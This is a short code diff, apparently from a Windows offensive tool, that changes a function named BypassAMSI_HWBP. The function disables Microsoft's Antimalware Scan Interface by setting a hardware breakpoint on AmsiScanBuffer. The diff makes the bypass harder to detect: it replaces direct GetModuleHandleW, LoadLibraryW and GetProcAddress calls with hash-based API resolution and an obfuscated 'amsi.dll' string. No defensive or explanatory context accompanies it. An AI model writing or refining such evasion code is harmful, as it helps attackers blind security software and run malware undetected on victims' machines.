@@ -76,10 +76,15 @@ static BOOL InstallHWBP(_In_ PVOID targetAddress, _In_ DWORD drIndex) {
 }
 
 static BOOL BypassAMSI_HWBP() {
-    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
-    if (!hAmsi) hAmsi = LoadLibraryW(L"amsi.dll");
+    HMODULE hAmsi = (HMODULE)GetModuleBaseByHash(HASH_AMSI);
+    if (!hAmsi) {
+        PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
+        typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
+        LoadLibraryW_t pLoadLibraryW = (LoadLibraryW_t)ResolveApiByHash(hKernel32, HASH_LoadLibraryW);
+        hAmsi = pLoadLibraryW(STOBFS_W(L"amsi.dll"));
+    }
     if (!hAmsi) return FALSE;
-    PVOID pAmsiScanBuffer = (PVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
+    PVOID pAmsiScanBuffer = ResolveApiByHash(hAmsi, HASH_AmsiScanBuffer);
     if (!pAmsiScanBuffer) return FALSE;
     return InstallHWBP(pAmsiScanBuffer, 0);
 }
